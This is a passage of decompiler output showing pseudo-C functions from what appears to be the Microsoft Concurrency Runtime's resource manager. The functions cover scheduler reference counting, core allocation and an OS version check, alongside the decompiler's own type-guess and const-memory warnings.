            v50 = v10;
            do
            {
              v51 = *v49;
              v52 = *(_DWORD **)(*v49 + 16);
              v53 = v52[58];
              v55 = v52[45];
              v56 = v52[55] - v53;
              v54 = v56;
              if ( v56 <= v55 )
                v56 = v55;
              if ( v53 + v56 > *(_DWORD *)(v51 + 4) )
              {
                v33 = 1;
                if ( v54 <= v55 )
                  v54 = v55;
                v57 = (double)(int)(v53 + v54) / v29;
                v58 = v57 - *(double *)(v51 + 32);
                *(double *)(v51 + 32) = v57;
                i = i + v58;
              }
              ++v49;
              --v50;
            }
            while ( v50 );
            if ( !v33 )
              break;
          }
        }
      }
      if ( *(_DWORD *)(*v20 + 4) > a3 )
      {
        v59 = v20 + 1;
        v60 = v10 - 1;
        do
        {
          v61 = *(_QWORD *)(*v59 + 16);
          v62 = *(_DWORD *)(v61 + 208) - *(_DWORD *)(*v59 + 4) - *(_DWORD *)(v61 + 216);
          if ( v62 )
            sub_13F146BAC(a1, a2, v61, v62);
          ++v59;
          --v60;
        }
        while ( v60 );
        v5 = sub_13F146F84(a1, a2, *(_DWORD *)(*v20 + 4) - a3, 0);
      }
      sub_13F14088C(v20, v49);
    }
  }
  return v5;
}
// 13F14674E: conditional instruction was optimized away because edi.4>=2u
// 13F146783: conditional instruction was optimized away because edi.4>=2u
// 13F1467FC: conditional instruction was optimized away because edi.4>=2u
// 13F146917: conditional instruction was optimized away because edi.4>=2u
// 13F14696C: variable 'v49' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F1469A0) ----------------------------------------------------
__int64 __fastcall sub_13F1469A0(__int64 a1)
{
  return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 8));
}

//----- (000000013F1469B0) ----------------------------------------------------
__int64 __fastcall sub_13F1469B0(__int64 a1, __int64 a2, int a3)
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pScheduler");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a3 != 0x10000 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"version");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  return sub_13F1438D0(a1, a2);
}
// 13F1469B0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F146A14) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F146A14(__int64 a1)
{
  unsigned __int32 v2; // esi
  __int64 v3; // rdx
  char v5[8]; // [rsp+28h] [rbp-20h] BYREF
  int v6; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v7)(); // [rsp+38h] [rbp-10h]

  v2 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 8));
  if ( !v2 )
  {
    if ( _InterlockedExchange(&dword_13F1C5DD8, 1) )
    {
      v6 = 0;
      v7 = sub_13F142C2C;
      do
        sub_13F141BF4((__int64)v5);
      while ( _InterlockedExchange(&dword_13F1C5DD8, 1) );
    }
    sub_13F142890(0i64);
    qword_13F1C5D58 = 0i64;
    dword_13F1C5DD8 = 0;
    if ( *(_QWORD *)(a1 + 104) )
    {
      sub_13F1419D8(a1 + 48);
      *(_DWORD *)(a1 + 44) = 2;
      sub_13F141BDC(a1 + 48);
      MEMORY[0x76F833A0](*(_QWORD *)(a1 + 112));
      sub_13F14286C();
    }
    sub_13F1430F0(a1, v3);
    sub_13F14088C(a1, 232i64);
  }
  return v2;
}
// 13F146A9C: write access to const memory at 13F1C5D58 has been detected
// 13F146AA3: write access to const memory at 13F1C5DD8 has been detected
// 13F146AE2: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F1C5D58: using guessed type __int64 qword_13F1C5D58;
// 13F1C5DD8: using guessed type int dword_13F1C5DD8;
// 13F146A14: using guessed type char var_20[8];

//----- (000000013F146B08) ----------------------------------------------------
__int64 __fastcall sub_13F146B08(__int64 a1, __int64 a2, unsigned int a3, int a4)
{
  unsigned int v4; // ebx
  char v9; // si
  unsigned int v10; // er14

  v4 = 0;
  v9 = 0;
  v10 = 1;
  if ( *(_DWORD *)(a1 + 12) > 1u )
  {
    do
    {
      if ( sub_13F146BAC(a1, a2, *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 120) + 8i64 * v10) + 16i64), a4) )
        v9 = 1;
      ++v10;
    }
    while ( v10 < *(_DWORD *)(a1 + 12) );
    if ( v9 )
      return (unsigned int)sub_13F146F84(a1, a2, a3, 0);
  }
  return v4;
}

//----- (000000013F146BAC) ----------------------------------------------------
char __fastcall sub_13F146BAC(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  int v6; // eax
  int v7; // ecx
  unsigned int v8; // edx
  int v9; // edx
  __int64 v10; // r15
  __int64 v11; // r10
  __int64 v12; // r14
  __int64 v13; // rcx
  __int64 v14; // rdi
  __int64 v15; // rbx
  int v16; // ebp

  if ( a4 == -2 )
  {
    v6 = *(_DWORD *)(a3 + 216);
    a4 = v6;
  }
  else
  {
    if ( a4 == -1 )
    {
      v7 = *(_DWORD *)(a3 + 232);
      v8 = *(_DWORD *)(a3 + 220) - v7;
      if ( v8 <= *(_DWORD *)(a3 + 180) )
        v8 = *(_DWORD *)(a3 + 180);
      a4 = *(_DWORD *)(a3 + 208) - *(_DWORD *)(a3 + 156) - (v7 + v8);
    }
    v6 = 0;
  }
  v9 = a4 - v6;
  if ( !a4 )
    return 0;
  v10 = *(_QWORD *)(a2 + 40);
  v11 = 0i64;
  v12 = *(_QWORD *)(a3 + 32);
  if ( !*(_DWORD *)(a1 + 28) )
    return 0;
  while ( 1 )
  {
    v13 = v12 + ((unsigned __int64)*(unsigned int *)(v10 + 4 * v11) << 6);
    if ( *(_DWORD *)(v13 + 36) != *(_DWORD *)(v13 + 44) )
    {
      v14 = 0i64;
      if ( *(_DWORD *)(v13 + 8) )
        break;
    }
LABEL_20:
    v11 = (unsigned int)(v11 + 1);
    if ( (unsigned int)v11 >= *(_DWORD *)(a1 + 28) )
      return 0;
  }
  while ( 1 )
  {
    v15 = *(_QWORD *)(v13 + 56);
    v16 = v9;
    if ( *(_DWORD *)(v15 + 72 * v14) == 4
      && !*(_DWORD *)(v15 + 72 * v14 + 56)
      && (*(_BYTE *)(v15 + 72 * v14 + 65) || v9) )
    {
      --v9;
      *(_DWORD *)(v15 + 72 * v14) = 5;
      ++*(_DWORD *)(a3 + 156);
      --**(_DWORD **)(v15 + 72 * v14 + 32);
      if ( *(_BYTE *)(v15 + 72 * v14 + 65) )
        v9 = v16;
      if ( !--a4 )
        return 1;
    }
    v14 = (unsigned int)(v14 + 1);
    if ( (unsigned int)v14 >= *(_DWORD *)(v13 + 8) )
      goto LABEL_20;
  }
}

//----- (000000013F146CD8) ----------------------------------------------------
__int64 __fastcall sub_13F146CD8(__int64 a1, __int64 a2)
{
  bool v4; // bp
  __int64 v5; // rbx
  _DWORD *v6; // rdi
  unsigned int v7; // eax
  __int64 result; // rax

  v4 = 0;
  v5 = a1 + 48;
  sub_13F1419D8(a1 + 48);
  v6 = *(_DWORD **)(a2 + 32);
  sub_13F150FD0(a2);
  v7 = v6[59];
  if ( v7 >= v6[44] + v6[58] )
    v7 = v6[44] + v6[58];
  if ( v6[52] < v7 && *(_DWORD *)(a1 + 12) == 1 )
    v4 = !sub_13F143F84(a1);
  result = sub_13F141BDC(v5);
  if ( v4 )
    return MEMORY[0x76F833A0](*(_QWORD *)(a1 + 112));
  return result;
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);

//----- (000000013F146D80) ----------------------------------------------------
__int64 __fastcall sub_13F146D80(__int64 a1, __int64 a2, char a3)
{
  char v6; // r12
  __int64 v7; // r14
  bool v8; // r15
  __int64 v9; // rbx
  __int64 v10; // rax
  __int64 v11; // rax
  unsigned __int128 v12; // rax
  unsigned __int128 v13; // rax

  v6 = 0;
  v7 = 0i64;
  v8 = 0;
  v9 = a1 + 48;
  sub_13F1419D8(a1 + 48);
  if ( a3 )
  {
    v7 = sub_13F152C10(a2);
    v8 = v7 == 0;
  }
  if ( *(_DWORD *)(a2 + 180) == *(_DWORD *)(a2 + 176) )
    ++*(_DWORD *)(a1 + 20);
  ++*(_DWORD *)(a1 + 12);
  v10 = *(_QWORD *)(a1 + 152);
  if ( v10 )
  {
    *(_QWORD *)(a2 + 48) = *(_QWORD *)(v10 + 48);
    *(_QWORD *)(a2 + 56) = *(_QWORD *)(a1 + 152);
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 152) + 48i64) + 56i64) = a2;
    *(_QWORD *)(*(_QWORD *)(a1 + 152) + 48i64) = a2;
  }
  else
  {
    *(_QWORD *)(a2 + 48) = a2;
    *(_QWORD *)(a2 + 56) = a2;
  }
  *(_QWORD *)(a1 + 152) = a2;
  ++*(_DWORD *)(a1 + 144);
  v11 = sub_13F145DC8(a1, a2, 1, v8);
  if ( !v7 )
    v7 = v11;
  if ( *(_DWORD *)(a2 + 180) == *(_DWORD *)(a2 + 176) )
    sub_13F1474A8(a1, a2);
  if ( *(_DWORD *)(a1 + 12) == 2 )
  {
    *(_DWORD *)(a1 + 44) = 1;
    if ( !*(_QWORD *)(a1 + 104) )
    {
      *(_QWORD *)(a1 + 104) = 1i64;
      v12 = *(unsigned int *)(a1 + 16) * (unsigned __int128)8ui64;
      if ( !is_mul_ok(*(unsigned int *)(a1 + 16), 8ui64) )
        *(_QWORD *)&v12 = -1i64;
      *(_QWORD *)(a1 + 128) = sub_13F1790C4(v12, *((_QWORD *)&v12 + 1));
      v13 = *(unsigned int *)(a1 + 16) * (unsigned __int128)8u;
      if ( !is_mul_ok(*(unsigned int *)(a1 + 16), 8ui64) )
        *(_QWORD *)&v13 = -1i64;
      *(_QWORD *)(a1 + 136) = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
      v6 = 1;
    }
    sub_13F141BDC(v9);
    MEMORY[0x76F833A0](*(_QWORD *)(a1 + 112));
    if ( v6 )
      sub_13F143850(a1);
  }
  else
  {
    sub_13F141BDC(v9);
  }
  return v7;
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F146F20) ----------------------------------------------------
__int64 __fastcall sub_13F146F20(__int64 a1, __int64 a2, unsigned int a3)
{
  int v3; // edi
  unsigned int i; // ebx

  v3 = 0;
  for ( i = 0; i < a3; i += sub_13F146F84(a1, a2, a3 - i, v3) )
    ++v3;
  return i;
}

//----- (000000013F146F84) ----------------------------------------------------
__int64 __fastcall sub_13F146F84(__int64 a1, __int64 a2, unsigned int a3, int a4)
{
  unsigned int v5; // esi
  unsigned int v8; // ecx
  char v9; // r11
  __int64 v10; // r13
  unsigned int v11; // edx
  __int64 i; // rbx
  __int64 v13; // r8
  __int64 v14; // rcx
  __int64 v15; // r10
  unsigned int v16; // edi
  __int64 v17; // r9
  int v18; // er11
  unsigned int v19; // er14
  __int64 v20; // rdx
  __int64 v21; // r12
  unsigned int v22; // er10
  __int64 v23; // r8
  _DWORD *v24; // rcx
  unsigned int v25; // er11
  unsigned int v26; // er11
  unsigned int v27; // eax
  __int64 j; // r8
  __int64 v29; // rax
  int v30; // er8
  int v32; // [rsp+60h] [rbp+8h]

  v32 = -1;
  v5 = a3;
  if ( *(_BYTE *)(a2 + 152) )
    v32 = sub_13F145234(a1, 0i64);
  v8 = *(_DWORD *)(a1 + 28);
  v9 = 0;
  v10 = *(_QWORD *)(a2 + 32);
  v11 = 0;
  for ( i = *(_QWORD *)(a2 + 40); v11 < v8; ++v11 )
  {
    v13 = 0i64;
    v14 = v10 + ((unsigned __int64)v11 << 6);
    if ( *(_DWORD *)(v14 + 8) )
    {
      do
      {
        v15 = *(_QWORD *)(v14 + 56);
        if ( *(_DWORD *)(v15 + 72 * v13) == 1 && a4 == **(_DWORD **)(v15 + 72 * v13 + 32) )
        {
          *(_DWORD *)(v15 + 72 * v13) = 2;
          v9 = 1;
          ++*(_DWORD *)(v14 + 12);
        }
        v13 = (unsigned int)(v13 + 1);
      }
      while ( (unsigned int)v13 < *(_DWORD *)(v14 + 8) );
    }
    v8 = *(_DWORD *)(a1 + 28);
  }
  v16 = 0;
  if ( v9 )
  {
    v17 = 0i64;
    if ( v8 )
    {
      v18 = v32;
      do
      {
        v19 = v17;
        v20 = v10 + ((unsigned __int64)*(unsigned int *)(i + 4 * v17) << 6);
        v21 = (unsigned int)v17;
        v22 = v5 - v16;
        if ( v5 != v16 )
        {
          if ( *(_DWORD *)(v20 + 12) > v22 )
            *(_DWORD *)(v20 + 12) = v22;
          v23 = (unsigned int)(v17 + 1);
          if ( (unsigned int)v23 < *(_DWORD *)(a1 + 28) )
          {
            do
            {
              v24 = (_DWORD *)(v10 + ((unsigned __int64)*(unsigned int *)(i + 4 * v23) << 6));
              v25 = v24[3];
              if ( v25 > v22 )
              {
                v24[3] = v22;
                v25 = v5 - v16;
              }
              v26 = v24[8] + v24[9] + v25;
              v27 = *(_DWORD *)(v20 + 32) + *(_DWORD *)(v20 + 36) + *(_DWORD *)(v20 + 12);
              if ( v27 < v26 || v27 == v26 && *(_BYTE *)(a2 + 152) && *(_DWORD *)(i + 4 * v23) == v32 )
              {
                v19 = v23;
                v20 = v10 + ((unsigned __int64)*(unsigned int *)(i + 4 * v23) << 6);
              }
              v23 = (unsigned int)(v23 + 1);
            }
            while ( (unsigned int)v23 < *(_DWORD *)(a1 + 28) );
            v18 = v32;
            v5 = a3;
            v21 = (unsigned int)v17;
          }
        }
        if ( *(_DWORD *)(v20 + 12) )
        {
          for ( j = 0i64; (unsigned int)j < *(_DWORD *)(v20 + 8); j = (unsigned int)(j + 1) )
          {
            v29 = *(_QWORD *)(v20 + 56);
            if ( *(_DWORD *)(v29 + 72 * j) == 2 )
            {
              if ( v16 >= v5 )
              {
                *(_DWORD *)(v29 + 72 * j) = 1;
              }
              else
              {
                *(_DWORD *)(v29 + 72 * j) = 3;
                ++**(_DWORD **)(v29 + 72 * j + 32);
                ++*(_DWORD *)(v20 + 32);
                if ( *(_BYTE *)(a2 + 152) && *(_DWORD *)(i + 4i64 * v19) == v18 )
                  *(_BYTE *)(a2 + 152) = 0;
                ++v16;
              }
            }
          }
          *(_DWORD *)(v20 + 12) = 0;
        }
        if ( (_DWORD)v17 != v19 )
        {
          v30 = *(_DWORD *)(i + 4 * v21);
          *(_DWORD *)(i + 4 * v21) = *(_DWORD *)(i + 4i64 * v19);
          *(_DWORD *)(i + 4i64 * v19) = v30;
        }
        v17 = (unsigned int)(v17 + 1);
      }
      while ( (unsigned int)v17 < *(_DWORD *)(a1 + 28) );
    }
  }
  return v16;
}

//----- (000000013F147180) ----------------------------------------------------
__int64 __fastcall sub_13F147180(__int64 a1)
{
  unsigned int i; // er8
  unsigned int v3; // er10
  unsigned __int64 v4; // rdx
  __int64 result; // rax
  _DWORD *v6; // rcx

  for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
  {
    v3 = 0;
    v4 = *(_QWORD *)(a1 + 96) + ((unsigned __int64)i << 6);
    *(_DWORD *)(v4 + 12) = 0;
    *(_DWORD *)(v4 + 40) = 0;
    if ( *(_DWORD *)(v4 + 8) )
    {
      do
      {
        result = v3++;
        v6 = (_DWORD *)(*(_QWORD *)(v4 + 48) + 48 * result);
        *v6 = 0;
        v6[9] = 0;
      }
      while ( v3 < *(_DWORD *)(v4 + 8) );
    }
  }
  return result;
}

//----- (000000013F1471D4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1471D4()
{
  __int64 result; // rax
  __int64 pExceptionObject[4]; // [rsp+20h] [rbp-158h] BYREF
  int v2; // [rsp+40h] [rbp-138h] BYREF
  int v3; // [rsp+44h] [rbp-134h]
  unsigned int v4; // [rsp+48h] [rbp-130h]

  v2 = 276;
  if ( !(unsigned int)MEMORY[0x76F7CDC0](&v2) )
  {
    sub_13F142E78(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
  }
  if ( v3 == 5 )
  {
    if ( !v4 )
    {
      dword_13F1C5D90 = 0;
      sub_13F142E78(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
    }
    result = v4 - 1;
    if ( v4 == 1 )
    {
      result = 1i64;
      dword_13F1C5D90 = 1;
    }
    else if ( v4 == 2 )
    {
      dword_13F1C5D90 = 2;
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    if ( v3 != 6 )
      goto LABEL_9;
    result = v4;
    if ( v4 )
    {
      if ( v4 == 1 )
      {
        dword_13F1C5D90 = 4;
LABEL_17:
        sub_13F1421D8();
        return sub_13F153000();
      }
LABEL_9:
      dword_13F1C5D90 = 6;
      goto LABEL_17;
    }
    dword_13F1C5D90 = 3;
  }
  return result;
}
// 13F147223: write access to const memory at 13F1C5D90 has been detected
// 13F14722F: write access to const memory at 13F1C5D90 has been detected
// 13F147251: write access to const memory at 13F1C5D90 has been detected
// 13F14726F: write access to const memory at 13F1C5D90 has been detected
// 13F147288: write access to const memory at 13F1C5D90 has been detected
// 13F1472AD: write access to const memory at 13F1C5D90 has been detected
// 13F147291: conditional instruction was optimized away because eax.4<2u
// 13F1C5D90: using guessed type int dword_13F1C5D90;
// 13F1471D4: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F1472EC) ----------------------------------------------------
__int64 __fastcall sub_13F1472EC(__int64 *a1, unsigned int a2)
{
  __int64 result; // rax
  unsigned int v3; // er9
  double v6; // xmm2_8
  __int64 *v7; // r8
  __int64 v8; // rbx
  __int64 v9; // rcx
  unsigned int v10; // er8
  __int64 *v11; // rbx
  __int64 v12; // rdi
  __int64 v13; // rsi
  unsigned int v14; // ebp
  __int64 *v15; // r14
  __int64 v16; // rdx
  __int64 v17; // rdx
  unsigned int v18; // er8
  __int64 *v19; // rbx
  __int64 v20; // rcx
  double v21; // xmm1_8
  __int64 *v22; // rbx
  __int64 v23; // rdi
  unsigned int v24; // esi
  unsigned int v25; // ebp
  __int64 *v26; // r14
  _DWORD *v27; // rdx
  __int64 v28; // r8
  __int64 v29; // rdx
  void *retaddr; // [rsp+8h] [rbp+0h] BYREF

  result = (__int64)&retaddr;
  v3 = 0;
  v6 = 0.0;
  if ( a2 )
  {
    v7 = a1;
    v8 = a2;
    do
    {
      *(_DWORD *)(*v7 + 4) = (int)*(double *)(*v7 + 8);
      v9 = *v7++;
      result = *(unsigned int *)(v9 + 4);
      *(double *)(v9 + 8) = *(double *)(v9 + 8) - (double)(int)result;
      --v8;
    }
    while ( v8 );
  }
  v10 = 0;
  if ( a2 )
  {
    v11 = a1;
    do
    {
      v12 = v10 + 1;
      v13 = v10;
      v14 = v12;
      if ( (unsigned int)v12 < a2 )
      {
        v15 = &a1[v12];
        do
        {
          result = (unsigned int)v13;
          if ( *(double *)(*v15 + 8) > *(double *)(a1[(unsigned int)v13] + 8) + 0.0000001 )
            v13 = v14;
          ++v14;
          ++v15;
        }
        while ( v14 < a2 );
        if ( v10 != (_DWORD)v13 )
        {
          result = a1[v13];
          v16 = *v11;
          *v11 = result;
          a1[v13] = v16;
        }
      }
      ++v11;
      ++v10;
    }
    while ( (unsigned int)v12 < a2 );
  }
  v17 = a2 - 1;
  v18 = 0;
  if ( a2 )
  {
    v19 = a1;
    do
    {
      while ( v6 > 0.0000001 )
      {
        if ( *(double *)(a1[v17] + 8) <= 0.0000001 )
        {
          v17 = (unsigned int)(v17 - 1);
        }
        else
        {
          do
          {
            v20 = a1[v17];
            v17 = (unsigned int)(v17 - 1);
            v6 = v6 - *(double *)(v20 + 8);
            *(_QWORD *)(v20 + 8) = 0i64;
          }
          while ( v6 > 0.0000001 );
        }
      }
      if ( v18 > (unsigned int)v17 )
        break;
      result = *v19;
      v21 = *(double *)(*v19 + 8);
      if ( v21 > 0.0000001 )
      {
        *(_QWORD *)(result + 8) = 0i64;
        result = *v19;
        ++*(_DWORD *)(*v19 + 4);
        v6 = v6 + 1.0 - v21;
      }
      ++v18;
      ++v19;
    }
    while ( v18 < a2 );
    v22 = a1;
    do
    {
      v23 = v3 + 1;
      v24 = v3;
      v25 = v23;
      if ( (unsigned int)v23 < a2 )
      {
        v26 = &a1[v23];
        do
        {
          v27 = (_DWORD *)*v26;
          v28 = v25;
          ++v26;
          result = *(unsigned int *)a1[v24];
          if ( *v27 >= (unsigned int)result )
            v28 = v24;
          ++v25;
          v24 = v28;
        }
        while ( v25 < a2 );
        if ( v3 != (_DWORD)v28 )
        {
          result = a1[v28];
          v29 = *v22;
          *v22 = result;
          a1[v28] = v29;
        }
      }
      ++v22;
      ++v3;
    }
    while ( (unsigned int)v23 < a2 );
  }
  return result;
}
// 13F147438: conditional instruction was optimized away because er10.4!=0

//----- (000000013F1474A8) ----------------------------------------------------
char *__fastcall sub_13F1474A8(__int64 a1, __int64 a2)
{
  char *result; // rax
  unsigned int i; // er10
  __int64 v5; // r11
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rcx
  __int64 v8; // r8
  int v9; // eax
  __int64 v10; // rdx
  __int64 v11; // rcx
  int v12; // eax
  unsigned int v13; // esi
  __int64 v14; // r14
  unsigned __int64 v15; // rbp
  unsigned __int64 v16; // rcx
  __int64 v17; // rbx
  bool v18; // zf
  unsigned int v19; // er13
  unsigned int v20; // er15
  char *v21; // rdx
  bool v22; // r8
  bool v23; // zf
  int v24; // [rsp+60h] [rbp+8h]

  result = (char *)*(unsigned int *)(a1 + 28);
  for ( i = 0; i < (unsigned int)result; ++i )
  {
    v5 = 0i64;
    v6 = (unsigned __int64)i << 6;
    v7 = v6 + *(_QWORD *)(a1 + 96);
    if ( *(_DWORD *)(v7 + 8) )
    {
      do
      {
        v8 = *(_QWORD *)(v7 + 48) + 48 * v5;
        v9 = *(_DWORD *)(v8 + 28);
        *(_DWORD *)(v8 + 28) = 0;
        *(_DWORD *)(v8 + 32) = v9;
        v10 = *(_QWORD *)(a1 + 152);
        if ( v10 )
          v10 = *(_QWORD *)(v10 + 48);
        while ( v10 )
        {
          v11 = *(_QWORD *)(v6 + *(_QWORD *)(v10 + 32) + 56);
          *(_DWORD *)(v11 + 72 * v5 + 48) = *(_DWORD *)(v11 + 72 * v5 + 44);
          v12 = *(_DWORD *)(v11 + 72 * v5 + 40);
          *(_DWORD *)(v11 + 72 * v5 + 44) = v12;
          *(_DWORD *)(v8 + 28) += v12;
          if ( v10 == *(_QWORD *)(a1 + 152) )
            v10 = 0i64;
          else
            v10 = *(_QWORD *)(v10 + 48);
        }
        v5 = (unsigned int)(v5 + 1);
        v7 = v6 + *(_QWORD *)(a1 + 96);
      }
      while ( (unsigned int)v5 < *(_DWORD *)(v7 + 8) );
    }
    result = (char *)*(unsigned int *)(a1 + 28);
  }
  v13 = 0;
  v24 = 0;
  if ( !(_DWORD)result )
    return result;
  do
  {
    v14 = 0i64;
    v15 = (unsigned __int64)v13 << 6;
    v16 = v15 + *(_QWORD *)(a1 + 96);
    if ( !*(_DWORD *)(v16 + 8) )
      goto LABEL_34;
    do
    {
      v17 = *(_QWORD *)(a1 + 152);
      result = (char *)(*(_QWORD *)(v16 + 48) + 48 * v14);
      v18 = v17 == 0;
      v19 = *((_DWORD *)result + 8);
      v20 = *((_DWORD *)result + 7);
      while ( 1 )
      {
        v17 = v18 ? 0i64 : *(_QWORD *)(v17 + 48);
        if ( !v17 )
          break;
        result = (char *)*(unsigned int *)(v17 + 176);
        if ( *(_DWORD *)(v17 + 180) == (_DWORD)result )
        {
          result = *(char **)(*(_QWORD *)(v17 + 32) + v15 + 56);
          v21 = &result[72 * v14];
          if ( *((_DWORD *)v21 + 13) )
          {
            if ( v17 == a2 )
            {
              v22 = v20 > *((_DWORD *)v21 + 11);
LABEL_26:
              result = sub_13F152E4C(v17, (__int64)v21, v22);
              goto LABEL_27;
            }
            if ( v19 == *((_DWORD *)v21 + 12) )
            {
              v23 = v20 == *((_DWORD *)v21 + 11);
              if ( v20 > *((_DWORD *)v21 + 11) )
              {
                v22 = 1;
                goto LABEL_26;
              }
            }
            else
            {
              v23 = v20 == *((_DWORD *)v21 + 11);
            }
            if ( v23 && v19 > *((_DWORD *)v21 + 12) )
            {
              v22 = 0;
              goto LABEL_26;
            }
          }
        }
LABEL_27:
        v18 = v17 == *(_QWORD *)(a1 + 152);
      }
      v14 = (unsigned int)(v14 + 1);
      v16 = v15 + *(_QWORD *)(a1 + 96);
    }
    while ( (unsigned int)v14 < *(_DWORD *)(v16 + 8) );
    v13 = v24;
LABEL_34:
    v24 = ++v13;
  }
  while ( v13 < *(_DWORD *)(a1 + 28) );
  return result;
}

//----- (000000013F147668) ----------------------------------------------------
_QWORD *__fastcall sub_13F147668(__int64 a1, __int64 a2, char a3)
{
  int v6; // eax
  unsigned int v7; // er14
  unsigned int v8; // ecx
  _QWORD *result; // rax
  __int64 v10; // rdi
  bool i; // zf
  int v12; // eax
  __int64 v13; // rcx

  sub_13F145A08(a1, a2);
  sub_13F15EF70(a2 + 112, 0, 0x30ui64);
  sub_13F145FC4(a1, 0, a2, a2 + 112);
  v6 = *(_DWORD *)(a2 + 236);
  v7 = 1;
  v8 = *(_DWORD *)(a2 + 176) + *(_DWORD *)(a2 + 232);
  *(_BYTE *)(a2 + 152) = a3;
  if ( v6 >= v8 )
    v6 = v8;
  *(double *)(a2 + 144) = (double)v6;
  result = *(_QWORD **)(a1 + 120);
  *result = a2 + 112;
  v10 = *(_QWORD *)(a1 + 152);
  for ( i = v10 == 0; ; i = v10 == *(_QWORD *)(a1 + 152) )
  {
    v10 = i ? 0i64 : *(_QWORD *)(v10 + 48);
    if ( !v10 )
      break;
    if ( v10 != a2 )
    {
      sub_13F15EF70(v10 + 112, 0, 0x30ui64);
      sub_13F145FC4(a1, v7, v10, v10 + 112);
      v12 = *(_DWORD *)(v10 + 236);
      if ( v12 >= (unsigned int)(*(_DWORD *)(v10 + 176) + *(_DWORD *)(v10 + 232)) )
        v12 = *(_DWORD *)(v10 + 176) + *(_DWORD *)(v10 + 232);
      v13 = v7++;
      *(double *)(v10 + 144) = (double)v12;
      result = *(_QWORD **)(a1 + 120);
      result[v13] = v10 + 112;
    }
  }
  return result;
}

//----- (000000013F147780) ----------------------------------------------------
__int64 __fastcall sub_13F147780(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // r10
  unsigned int i; // edx
  __int64 v8; // rcx
  unsigned int j; // er8
  __int64 v10; // r9
  _DWORD *v11; // rax
  int v12; // ebp

  sub_13F1419D8(a1 + 48);
  --*(_DWORD *)(a1 + 144);
  *(_QWORD *)(*(_QWORD *)(a2 + 48) + 56i64) = *(_QWORD *)(a2 + 56);
  *(_QWORD *)(*(_QWORD *)(a2 + 56) + 48i64) = *(_QWORD *)(a2 + 48);
  v4 = *(_QWORD *)(a1 + 152);
  if ( a2 == v4 )
  {
    if ( v4 == *(_QWORD *)(v4 + 48) )
      v5 = 0i64;
    else
      v5 = *(_QWORD *)(v4 + 56);
    *(_QWORD *)(a1 + 152) = v5;
  }
  v6 = *(_QWORD *)(a2 + 32);
  for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
  {
    v8 = v6 + ((unsigned __int64)i << 6);
    if ( *(_DWORD *)(v8 + 36) )
    {
      for ( j = 0; j < *(_DWORD *)(v8 + 8); ++j )
      {
        v10 = *(_QWORD *)(v8 + 56);
        if ( *(_DWORD *)(v10 + 72i64 * j) == 4 )
        {
          v11 = *(_DWORD **)(v10 + 72i64 * j + 32);
          --*v11;
        }
      }
    }
  }
  if ( *(_DWORD *)(a2 + 180) == *(_DWORD *)(a2 + 176) )
    --*(_DWORD *)(a1 + 20);
  v12 = *(_DWORD *)(a1 + 12) - 1;
  *(_DWORD *)(a1 + 12) = v12;
  if ( v12 == 1 )
    *(_DWORD *)(a1 + 44) = 0;
  sub_13F141BDC(a1 + 48);
  if ( v12 == 1 )
    MEMORY[0x76F833A0](*(_QWORD *)(a1 + 112));
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 64i64))(a2);
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1478A0) ----------------------------------------------------
__int64 __fastcall sub_13F1478A0(__int64 a1, __int64 a2)
{
  __int64 v4; // rbx
  __int64 v5; // rdi

  v4 = a1 + 48;
  sub_13F1419D8(a1 + 48);
  v5 = sub_13F152C10(a2);
  if ( !v5 )
    v5 = sub_13F145DC8(a1, a2, 0, 1);
  sub_13F141BDC(v4);
  return v5;
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);

//----- (000000013F147918) ----------------------------------------------------
